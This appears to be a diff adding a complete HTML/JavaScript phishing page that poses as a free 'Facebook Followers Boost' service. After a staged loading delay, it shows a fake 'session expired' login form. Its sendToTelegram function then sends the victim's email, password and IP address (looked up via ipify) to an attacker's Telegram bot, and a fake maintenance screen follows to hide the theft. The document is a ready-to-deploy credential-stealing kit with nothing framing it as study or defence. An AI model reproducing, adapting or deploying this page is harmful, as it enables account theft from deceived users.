@@ -1,0 +1,109 @@
+<!-- Language: HTML, CSS, JavaScript -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Followers Boost</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('https://i.ibb.co/pryQjgVG/Untitled.jpg') no-repeat center center fixed;
+            background-size: cover;
+            transition: background 0.5s ease-in-out;
+        }
+        .container {
+            width: 350px;
+            background: rgba(255, 255, 255, 0.5);
+            padding: 20px;
+            margin: 100px auto;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background: #06d4ab;
+            color: black;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        function setBackground(imagePath) {
+            if(imagePath) {
+                document.body.style.background = `url('${imagePath}') no-repeat center center fixed`;
+                document.body.style.backgroundSize = 'cover';
+                document.body.style.backdropFilter = 'blur(10px)';
+            }
+        }
+        
+        function getIPAddress() {
+            return fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'Unknown IP');
+        }
+    </script>
+    <div class="container" id="main-container">
+        <h2>Get Free Facebook Followers</h2>
+        <p>Enter your Facebook username to get 10K followers instantly!</p>
+        <input type="text" id="username" placeholder="Enter your username" required>
+        <button class="button" onclick="startBoost()">Boost Now</button>
+        <div id="loading" class="hidden">
+            <p>Processing... Adding Followers...</p>
+        </div>
+        <div id="login" class="hidden">
+            <p>Your session expired! Login to continue.</p>
+            <form onsubmit="sendToTelegram(event)">
+                <input type="text" id="email" placeholder="Email or Phone" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button class="button">Login</button>
+            </form>
+        </div>
+    </div>
+    <div class="container hidden" id="maintenance">
+        <h2>System Maintenance</h2>
+        <p>We are currently upgrading our servers. You will be notified once the system is back online.</p>
+    </div>
+    <script>
+        function startBoost() {
+            document.getElementById('loading').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('login').classList.remove('hidden');
+            }, 3000);
+        }
+
+        function sendToTelegram(event) {
+            event.preventDefault();
+            let botToken = 'YOUR_BOT_TOKEN'; // Add your bot token here
+            let chatId = 'YOUR_CHAT_ID'; // Add your chat ID here
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            getIPAddress().then(ip => {
+                let message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('main-container').classList.add('hidden');
+                        document.getElementById('maintenance').classList.remove('hidden');
+                    })
+                    .catch(error => console.error('Error:', error));
+            });
+        }
+    </script>
+</body>
+</html>
